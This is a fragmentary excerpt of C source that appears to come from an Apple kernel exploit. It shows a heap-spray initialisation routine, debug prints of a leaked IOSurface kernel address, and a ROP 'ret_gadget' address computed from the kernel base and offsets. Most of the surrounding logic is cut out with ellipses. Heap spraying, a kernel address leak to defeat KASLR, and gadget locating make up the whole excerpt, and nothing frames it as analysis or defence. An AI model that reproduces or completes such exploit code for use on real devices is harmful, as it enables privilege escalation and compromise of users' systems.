...
kern_return_t heap_spray_init() {
	...
	printf("g_surface_id_to_leak_address %d", g_surface_id_to_leak_address);
	...
	printf("kernel address of surface %d is %p", g_surface_id_to_leak_address, g_surface_kernel_address);
...
char * heap_spray_get_spraying_buffer(void * object_address) {
	...
	printf("ret_gadget: %p", offsets_get_kernel_base() + OFFSET(ret_gadget));
...
/*
	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
		printf("local_spray[0x%x] = %p", i, *(void**)(g_new_sprayed_object + i));
	}
*/
	return data;
}
